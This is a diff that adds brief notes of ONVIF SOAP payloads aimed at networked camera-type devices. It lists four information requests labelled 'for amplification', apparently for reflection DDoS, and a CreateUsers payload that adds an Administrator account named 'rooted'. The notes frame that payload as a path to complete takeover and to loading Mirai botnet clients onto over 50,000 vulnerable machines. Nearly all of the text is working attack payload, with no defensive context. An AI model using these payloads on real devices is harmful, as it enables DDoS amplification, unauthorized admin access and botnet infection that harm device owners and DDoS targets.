@@ -1,0 +1,18 @@
+Other payloads for amplification:
+-------------------------------
+<tds:GetDeviceInformation/>
+<tds:GetServices/>
+<tds:GetCapabilities/>
+<trt:GetProfiles/>
+-------------------------------
+
+Also noted that payloads can edit system.
+Adding Admin account could lead to complete takeover and loading MIPS/Arm Mirai clients to over 50,000 vulnerable machines.
+-------------------------------
+<tds:CreateUsers>
+    <tds:User>
+        <tt:Username>rooted</tt:Username>
+        <tt:UserLevel>Administrator</tt:UserLevel>
+    </tds:User>
+</tds:CreateUsers>
+-------------------------------
